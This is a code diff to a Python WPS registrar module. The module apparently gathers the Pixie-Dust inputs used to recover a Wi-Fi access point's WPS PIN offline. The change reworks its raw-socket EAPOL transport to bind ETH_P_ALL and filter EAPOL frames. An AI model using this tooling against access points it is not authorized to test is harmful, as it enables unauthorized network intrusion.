@@ -10,8 +10,9 @@ the Enrollee, which is what Pixie-Dust needs).
 Layers:
   * WSC TLV codec + EAP/EAPOL framing (byte-compatible with hostap)
   * WpsRegistrar — the message state machine (M1 in, M2 out, M3 in ...)
-  * EAPOL transport over nl80211 control-port frames (control-port-over-nl80211),
-    which is how FullMAC drivers (most Android phone chips) carry EAPOL
+  * EAPOL transport: control-port-over-nl80211 when the driver supports it,
+    otherwise an AF_PACKET socket bound to ETH_P_ALL (the hostap l2_packet
+    workaround for the unauthorized-station RX regression)
   * nl80211 CONNECT association (managed mode)
 
 It collects the six Pixie-Dust inputs (E-Nonce, PKE, PKR, AuthKey, E-Hash1,
@@ -24,6 +25,7 @@ rooted device with a real Wi-Fi adapter and is NOT exercised by the test suite.
 import os
 import socket
 import struct
+import time
 
 import wps_crypto as wc
 from wps_crypto import (NONCE_LEN, derive_keys, authenticator)
@@ -87,6 +89,8 @@ WSC_FLAGS_LF = 0x02
 WSC_Start, WSC_ACK, WSC_NACK, WSC_MSG, WSC_Done, WSC_FRAG_ACK = (
     0x01, 0x02, 0x03, 0x04, 0x05, 0x06)
 ETH_P_PAE = 0x888E
+ETH_P_ALL = 0x0003
+PACKET_OUTGOING = 4
 REGISTRAR_IDENTITY = b'WFA-SimpleConfig-Registrar-1-0'
 WFA_VENDOR_EXT = b'\x00\x37\x2a'   # WFA OUI inside WSC Vendor Extension
 WPS_VERSION = 0x10
@@ -469,21 +473,43 @@ class EapolPort:
 
 
 class EapolSocket:
-    """Fallback EAPOL transport over AF_PACKET (drivers without control-port-over-nl80211)."""
+    """Fallback EAPOL transport over AF_PACKET (drivers without control-port-over-nl80211).
+
+    Bound to ETH_P_ALL, NOT ETH_P_PAE. A packet socket bound to a *specific*
+    protocol silently drops the AP's EAPOL while the station is associated but
+    the 802.1X port is still unauthorized — exactly the WPS case. This is the
+    documented Linux packet-socket regression that hostap's l2_packet works
+    around with an ETH_P_ALL socket + ethertype filter (l2_packet_linux.c). We
+    bind ETH_P_ALL and match the 0x888E ethertype in Python (recvfrom returns
+    the ethertype in the address tuple), which is the same fix without a BPF.
+    """
 
     def __init__(self, interface, peer_mac, timeout=8):
         self.interface = interface
         self.peer_mac = peer_mac
-        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_PAE))
-        self.sock.bind((interface, ETH_P_PAE))
-        self.sock.settimeout(timeout)
+        self.timeout = timeout
+        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_ALL))
+        self.sock.bind((interface, ETH_P_ALL))
 
     def send(self, frame):
+        # The ethertype/dest come from the address tuple, so TX is still EAPOL
+        # to the AP even though the socket itself is bound to ETH_P_ALL.
         self.sock.sendto(frame, (self.interface, ETH_P_PAE, 0, 0, self.peer_mac))
 
     def recv(self):
-        data, _ = self.sock.recvfrom(2048)
-        return data
+        deadline = time.monotonic() + self.timeout
+        while True:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                raise socket.timeout()
+            self.sock.settimeout(remaining)
+            data, addr = self.sock.recvfrom(2048)
+            # addr = (ifname, ethertype, pkttype, hatype, hwaddr)
+            if addr[1] != ETH_P_PAE:
+                continue                      # not EAPOL — drop
+            if len(addr) > 2 and addr[2] == PACKET_OUTGOING:
+                continue                      # our own transmitted frame, echoed back
+            return data
 
     def close(self):
         try:
